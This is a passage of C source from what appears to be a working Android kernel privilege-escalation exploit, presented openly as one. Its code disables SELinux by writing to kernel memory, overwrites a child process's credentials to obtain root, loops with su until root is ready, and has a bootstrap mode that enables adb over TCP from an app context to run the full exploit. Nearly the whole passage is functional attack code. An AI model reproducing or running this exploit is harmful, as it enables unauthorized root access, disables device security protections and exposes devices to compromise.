        fflush(stdout);
        fsync(STDOUT_FILENO);
        for (;;)
          sleep(30);
      }
      return (cfi_last_step == 0 && cfi_dirty_seen) || cfi_write_ret > 0 ? 0 : 1;
      }
    }
  } else if (force_w1) {
    pr_info("FORCE_WRITE1=1: skipping UMH mode=4\n");
  }

  if (!selinux_ok && !root_child_done) {
    /* Fallback: direct PI write to selinux_enforcing */
    slab_drain();
    TIMER("pre-W1 drain");
    for (int att = 1; att <= 5 && !selinux_ok; att++) {
      pr_info("Write 1 attempt %d/5\n", att);
      do_one_write(data_addr(SELINUX_ENFORCING), "W1: SELinux", 1);
      usleep(100000);
      if (check_selinux_off()) { pr_success("SELinux DISABLED\n"); selinux_ok = 1; }
    }
    if (!selinux_ok) { pr_error("Write 1 failed\n"); return 1; }
    TIMER("Write 1 complete");
  } else if (!selinux_ok && root_child_done) {
    selinux_ok = 1;
  } else {
    pr_success("SELinux off (UMH or already)\n");
  }

  /* Phase 2: Check if UMH root succeeded */
  if (root_child_done) {
    pr_success("UMH root done — skipping W2\n");
    TIMER("exploit complete (UMH)");
    pr_info("waiting for su...\n");
    for (int i = 0; i < 60; i++) {
      if (system("su -c 'id' > /dev/null 2>&1") == 0) {
        pr_success("su ready, fixing SELinux policy\n");
        system("su -c 'load_policy /sys/fs/selinux/policy' > /dev/null 2>&1");
        pr_success("load_policy done\n");
        break;
      }
      sleep(1);
    }
    return 0;
  }

  /* Phase 2 fallback: Find child task_struct + cred overwrite */
  pr_info("UMH not available, falling back to W2 cred path\n");
  slab_drain();
  TIMER("pre-W2 drain");

  struct child_pipes pipes;
  pid_t child = spawn_child(&pipes);
  if (child < 0) { pr_error("fork failed\n"); return 1; }

  uintptr_t child_task = 0;
  read(pipes.task_r, &child_task, sizeof(child_task));
  close(pipes.task_r);
  TIMER("perf_find_task done");

  if (!child_task) {
    pr_info("perf returned 0, retrying...\n");
    waitpid(child, NULL, 0);
    child = spawn_child(&pipes);
    if (child < 0) { pr_error("retry fork failed\n"); return 1; }
    read(pipes.task_r, &child_task, sizeof(child_task));
    close(pipes.task_r);
  }

  if (!child_task) {
    pr_error("Cannot find task_struct (perf blocked by seccomp?)\n");
    close(pipes.cmd_w);
    waitpid(child, NULL, 0);
    return 1;
  }

  pr_info("child_pid=%d child_task=0x%016zx\n", child, child_task);
  pselect_child_node = 1;

  int got_root = 0;
  for (int round = 1; round <= 10 && !got_root; round++) {
    pr_info("round %d/10: cred write\n", round);
    slab_drain();
    do_one_write(child_task + TASK_CRED_OFF, "W2: cred", 2);
    usleep(50000);
    write(pipes.cmd_w, "C", 1);
    uint32_t child_uid = 9999;
    read(pipes.uid_r, &child_uid, sizeof(child_uid));
    pr_info("child uid = %u\n", child_uid);
    if (child_uid == 0) { pr_success("child is root!\n"); got_root = 1; }
  }

  write(pipes.cmd_w, "G", 1);
  close(pipes.cmd_w); close(pipes.uid_r);

  if (!got_root) {
    pr_error("failed after 10 rounds\n");
    waitpid(child, NULL, 0);
    return 1;
  }

  sleep(2);
  TIMER("exploit complete");

  pr_info("waiting for su...\n");
  for (int i = 0; i < 60; i++) {
    if (system("su -c 'id' > /dev/null 2>&1") == 0) {
      pr_success("su ready, fixing SELinux policy\n");
      system("su -c 'load_policy /sys/fs/selinux/policy' > /dev/null 2>&1");
      pr_success("load_policy done\n");
      break;
    }
    sleep(1);
  }

  return 0;
}

int install_embedded_wallpaper(void) { return 0; }

static int run_write1_only(void);
extern int mini_adb_port;
extern int mini_adb_shell(const char *cmd);

/* --bootstrap mode: runs from app context (any UID, with seccomp).
 * 1) Write 1 → SELinux off
 * 2) setprop to enable adb TCP on 5555 (SELinux off → property_service allows it)
 * 3) mini-adb connects to 127.0.0.1:5555, authenticates with pre-pushed key,
 *    runs full exploit via adb shell (no app seccomp → perf works)
 */
static int run_bootstrap(void) {
  log_startup_context();

  int ret = run_write1_only();
  if (ret != 0) return ret;

  /* Wait for adb TCP — read the actual port from system property */
  int adb_port = 5555;
  char port_buf[32] = {};
  read_first_line("/data/local/tmp/a/adb_port", port_buf, sizeof(port_buf));
  if (port_buf[0]) adb_port = atoi(port_buf);
  if (adb_port <= 0 || adb_port > 65535) adb_port = 5555;
  pr_info("Waiting for adb TCP on port %d...\n", adb_port);
  for (int i = 0; i < 30; i++) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = {
      .sin_family = AF_INET,
      .sin_port = htons(adb_port),
      .sin_addr.s_addr = htonl(0x7f000001)
    };
    int c = (sock >= 0) ? connect(sock, (struct sockaddr *)&addr, sizeof(addr)) : -1;
    if (sock >= 0) close(sock);
    if (c == 0) {
      pr_success("adbd ready on port %d (attempt %d)\n", adb_port, i + 1);
      goto tcp_ready;
    }
    usleep(1000000);
  }
  pr_error("adbd not on TCP %d after 30s\n", adb_port);
  return 1;
tcp_ready:
  usleep(200000);
  mini_adb_port = adb_port;
  pr_info("Connecting via mini-adb on port %d...\n", adb_port);
  int adb_ret = mini_adb_shell("/data/local/tmp/a/e");
  pr_info("mini-adb returned %d\n", adb_ret);

  return adb_ret;
}

static int run_write1_only(void) {
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  if (!active_offsets && select_offsets() < 0) return 1;
  init_p0_profile();
  init_ashmem_path();
  pin_to_core(g_core_sel);
  kaslr_slide = 0;
  kaslr_base = KIMAGE_TEXT_BASE;
  kaslr_done = 1;

  if (check_selinux_off()) {
    pr_success("SELinux already off\n");
    return 0;
  }

  for (int att = 1; att <= 20; att++) {
    slab_drain();
    pr_info("Write 1 attempt %d/20\n", att);
    do_one_write(data_addr(SELINUX_ENFORCING), "W1: SELinux", 1);
    usleep(100000);
    if (check_selinux_off()) {
      pr_success("SELinux DISABLED\n");
      return 0;
    }
  }
  pr_error("Write 1 failed after 20 attempts\n");
  return 1;
}

int main(int argc, char **argv) {
    handle_umh_mode(argc, argv);
    if (argc > 1 && strcmp(argv[1], "--bootstrap") == 0)
        return run_bootstrap();
    if (argc > 1 && strcmp(argv[1], "--write1") == 0)
        return run_write1_only();
    return run_exploit(argc, argv);
}
